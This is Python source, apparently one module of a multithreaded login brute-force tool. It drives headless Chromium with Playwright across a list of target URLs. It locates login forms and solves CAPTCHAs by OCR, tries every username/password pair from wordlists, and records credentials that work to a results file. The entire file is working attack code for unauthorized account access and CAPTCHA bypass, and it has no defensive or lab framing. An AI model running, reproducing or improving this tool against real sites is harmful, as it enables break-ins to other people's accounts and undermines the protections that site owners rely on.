from playwright.sync_api import sync_playwright
import config
from utils import logger, load_file, get_ocr_result
import queue
from concurrent.futures import ThreadPoolExecutor

# ... (Previous imports)

# 全局停止标志
STOP_FLAG = False

# ... (Previous helper functions safe_fill, get_captcha_code, find_login_elements)
# 为了避免多线程下的作用域问题，将 find_login_elements 等辅助函数再次确认定义在全局

def safe_fill(element, value):
    try:
        element.wait_for(state="visible", timeout=2000)
        element.fill("")
        element.fill(value)
        return True
    except Exception:
        return False

def get_captcha_code(page, captcha_img):
    try:
        if not captcha_img.is_visible():
            captcha_img.scroll_into_view_if_needed(timeout=1000)
        if not captcha_img.is_visible():
            return ""
        captcha_bytes = captcha_img.screenshot(timeout=2000)
        return get_ocr_result(captcha_bytes)
    except Exception as e:
        logger.warning(f"获取验证码失败: {e}")
        return ""

def find_login_elements(page):
    import time # Ensure time is available
    user_input = None
    pass_input = None
    login_btn = None
    
    for _ in range(3):
        for selector in ["input[type='text']", "input[type='email']", "input[name*='user']", "input[id*='user']"]:
            if page.locator(selector).count() > 0:
                user_input = page.locator(selector).first
                break
        
        if page.locator("input[type='password']").count() > 0:
            pass_input = page.locator("input[type='password']").first
        
        for selector in ["button[type='submit']", "input[type='submit']", "button:has-text('Login')", "button:has-text('登录')"]:
            if page.locator(selector).count() > 0:
                login_btn = page.locator(selector).first
                break
        
        if user_input and pass_input and login_btn:
            return user_input, pass_input, login_btn
        
        time.sleep(1)

    return None, None, None

def crack_worker(url_queue, usernames, passwords):
    """
    工作线程函数：
    1. 启动一个浏览器实例
    2. 循环从队列获取 URL 进行处理
    3. 队列为空时关闭浏览器
    """
    global STOP_FLAG
    
    if STOP_FLAG: return

    logger.info(f"[Worker Start] 启动浏览器进程 (Headless={config.HEADLESS})...")
    
    with sync_playwright() as p:
        try:
            # 启动浏览器 (每个线程一个)
            browser = p.chromium.launch(headless=config.HEADLESS)
            
            while not STOP_FLAG:
                try:
                    # 非阻塞获取任务，如果没有任务则退出
                    url = url_queue.get_nowait()
                except queue.Empty:
                    break
                
                logger.info(f"[Processing] 开始处理: {url}")
                
                # 为每个 URL 创建一个新的 Context (确保环境隔离)
                context = browser.new_context(ignore_https_errors=True)
                page = context.new_page()
                page.set_default_timeout(30000)
                
                try:
                    _process_single_url(page, context, url, usernames, passwords)
                except Exception as e:
                    logger.error(f"[{url}] 处理异常: {e}")
                finally:
                    context.close() # 关闭当前页签/上下文
                    url_queue.task_done()
                    
        except Exception as e:
            logger.error(f"[Worker Error] 浏览器进程异常: {e}")
        finally:
            # 只有当线程退出时才关闭浏览器
            try:
                browser.close()
            except:
                pass
            logger.info("[Worker End] 浏览器进程已关闭")

def _process_single_url(page, context, url, usernames, passwords):
    """
    单个 URL 的具体爆破逻辑 (复用 process_target 的核心逻辑)
    """
    global STOP_FLAG
    
    try:
        if STOP_FLAG: return
        page.goto(url)
        page.wait_for_load_state("networkidle")
    except Exception as e:
        logger.warning(f"页面加载超时或失败 {url}: {e}")
        return

    # 初始定位元素
    user_input, pass_input, login_btn = find_login_elements(page)

    if not user_input or not pass_input or not login_btn:
        logger.warning(f"无法定位登录元素，跳过: {url}")
        return

    # 寻找验证码
    captcha_img = None
    captcha_input = None
    
    try:
        images = page.locator("img").all()
        for img in images:
            src = img.get_attribute("src") or ""
            id_ = img.get_attribute("id") or ""
            if "captcha" in src.lower() or "code" in src.lower() or "captcha" in id_.lower():
                captcha_img = img
                break
    except Exception:
        pass

    if captcha_img:
        logger.info(f"[{url}] 检测到验证码，启用 OCR 识别")
        if page.locator("input[name*='captcha']").count() > 0:
            captcha_input = page.locator("input[name*='captcha']").first
        elif page.locator("input[id*='code']").count() > 0:
            captcha_input = page.locator("input[id*='code']").first
    
    # 开始爆破循环
    found = False
    for user in usernames:
        if found and config.STOP_ON_SUCCESS: break 
        if STOP_FLAG: break
        for i, pwd in enumerate(passwords):
            if STOP_FLAG: break
            
            try:
                logger.info(f"[{url}] 尝试: {user}:{pwd} ({i+1}/{len(passwords)})")
                
                # 状态检查与恢复 (省略部分重复代码，逻辑保持一致)
                is_login_page = "login" in page.url.lower() or page.locator("input[type='password']").count() > 0
                
                if not is_login_page:
                        logger.debug(f"[{url}] 当前不在登录页，尝试重置...")
                        page.goto(url)
                        page.wait_for_load_state("networkidle")
                        user_input, pass_input, login_btn = find_login_elements(page)
                
                if not user_input or not pass_input or not login_btn:
                    user_input, pass_input, login_btn = find_login_elements(page)
                
                if not user_input or not pass_input:
                    logger.error(f"[{url}] 无法定位输入框，跳过此密码")
                    continue

                if not safe_fill(user_input, user):
                    logger.warning(f"[{url}] 输入框不可用，尝试刷新页面重试...")
                    page.goto(url)
                    page.wait_for_load_state("networkidle")
                    user_input, pass_input, login_btn = find_login_elements(page)
                    if not user_input or not safe_fill(user_input, user):
                        continue 
                
                if not safe_fill(pass_input, pwd):
                        # 如果密码框填不了，尝试刷新
                        page.goto(url)
                        page.wait_for_load_state("networkidle")
                        user_input, pass_input, login_btn = find_login_elements(page)
                        safe_fill(user_input, user)
                        if not safe_fill(pass_input, pwd):
                            continue
                
                if captcha_img and captcha_input:
                    code = get_captcha_code(page, captcha_img)
                    if code:
                        safe_fill(captcha_input, code)
                    else:
                        logger.warning("验证码不可见或识别失败，尝试盲打")

                # 点击登录
                try:
                    login_btn.click(timeout=3000)
                except:
                    page.evaluate("arguments[0].click();", login_btn.element_handle())
                
                page.wait_for_timeout(3000)
                
                # 结果判定
                current_url = page.url
                has_password_field = page.locator("input[type='password']").count() > 0
                page_content = page.content().lower()
                
                # 使用全局配置的错误关键词
                has_error = any(k.lower() in page_content for k in config.ERROR_KEYWORDS) and len(page_content) < 5000 
                
                is_url_changed = current_url != url and "login" not in current_url.lower()
                
                # 修正后的判定逻辑：必须同时满足 "无错误关键词"
                if is_url_changed and not has_password_field and not has_error:
                        if "error" in current_url.lower() or "fail" in current_url.lower():
                            logger.info(f"[{url}] 检测到 URL 包含错误关键词，判定为失败")
                        else:
                            logger.info(f"[SUCCESS] 模拟登录成功: {url} -> {user}:{pwd}")
                            with open("results.txt", "a", encoding="utf-8") as f:
                                f.write(f"{url} | {user}:{pwd}\n")
                            
                            if config.STOP_ON_SUCCESS:
                                found = True
                                break 
                elif has_error:
                     logger.info(f"[{url}] 页面包含错误关键词，判定为失败")

                if not is_url_changed or has_error:
                        # 失败恢复
                        logger.debug(f"[{url}] 登录失败，强制重置状态...")
                        try:
                            context.clear_cookies()
                            page.goto(url)
                            page.wait_for_load_state("networkidle")
                            user_input, pass_input, login_btn = find_login_elements(page) 
                        except Exception as e:
                            logger.error(f"[{url}] 重置状态失败: {e}")
                            user_input = None

                        if not user_input: continue

            except Exception as e:
                logger.error(f"[{url}] 爆破过程异常: {e}")
                try:
                    page.goto(url)
                    page.wait_for_load_state("networkidle")
                except:
                    pass

def run_complex_crack():
    """
    针对复杂列表（加密/验证码）进行 Playwright 模拟爆破 (Worker 模式)
    """
    global STOP_FLAG
    logger.info(f"开始复杂模式爆破 (线程池={config.THREADS}, Headless={config.HEADLESS})...")
    
    targets = load_file(config.COMPLEX_LIST_FILE)
    if not targets:
        logger.warning("复杂目标列表为空，跳过。")
        return

    usernames = load_file(config.USERNAME_FILE) or config.DEFAULT_USERNAMES
    passwords = load_file(config.PASSWORD_FILE) or config.DEFAULT_PASSWORDS
    
    # 将所有目标放入队列
    url_queue = queue.Queue()
    for url in targets:
        url_queue.put(url)
        
    executor = ThreadPoolExecutor(max_workers=config.THREADS)
    futures = []
    
    try:
        # 启动固定数量的 Worker 线程
        # 每个 Worker 会自动处理队列中的 URL，直到队列为空
        for _ in range(config.THREADS):
            futures.append(executor.submit(crack_worker, url_queue, usernames, passwords))
        
        executor.shutdown(wait=True)
            
    except KeyboardInterrupt:
        logger.warning("\n!!! 检测到用户中断 (Ctrl+C) !!!")
        STOP_FLAG = True
        executor.shutdown(wait=False)
        logger.warning("已发送停止信号。")
